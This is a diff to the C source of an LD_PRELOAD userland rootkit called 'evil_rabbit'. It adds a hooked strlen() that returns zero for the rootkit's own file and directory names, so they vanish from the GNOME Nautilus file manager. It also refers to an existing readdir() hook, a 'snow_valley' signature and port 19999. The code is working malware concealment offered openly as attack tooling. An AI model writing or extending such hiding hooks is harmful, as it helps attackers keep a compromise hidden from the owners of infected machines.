@@ -32,11 +32,13 @@
 
 #define HIDE_FILE1  "ld.so.preload"
 #define HIDE_FILE2  "evil_rabbit"
-#define SIGNATURE  "snow_valley"
-#define PORT       19999
+#define HIDE_DIR    "EVIL_RABBIT"
+#define SIGNATURE   "snow_valley"
+#define PORT        19999
 
 
-static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
+static struct dirent* (*original_readdir)(DIR * ) = NULL;
+static size_t (*original_strlen)(const char * ) = NULL;            
 static int PEACE_FLAG = 0;
 
 
@@ -142,7 +144,8 @@ void peace()
 }
 
 
-// Find the address of a symbol starting from our preloaded SO (evil_rabbit.so)
+// Analogous to GetProcAddress() on Windows platform, it is used to find the address of a symbol. 
+// Start its search from our preloaded SO (evil_rabbit.so)
 void *findSymbolAddress(char *symbol)
 {
 	void *address = dlsym(RTLD_NEXT, symbol);
@@ -213,3 +216,18 @@ struct dirent *readdir(DIR *dirp)
 	return dp;		// <E>
 }
 
+
+// Nautilus (file manager for GNOME) uses strlen() to allcate space for files to display.
+// This function attempts to hide our files and directories from nautilus.
+size_t strlen(const char *s)
+{
+    if ( !strcmp(s, HIDE_FILE1) ||
+         !strcmp(s, HIDE_FILE2) ||
+         !strcmp(s, HIDE_DIR)    )  return 0;
+
+    if (original_strlen == NULL)
+        original_strlen = (size_t (*)(const char *))findSymbolAddress("strlen");
+
+    size_t result = original_strlen(s);
+    return result;
+} 
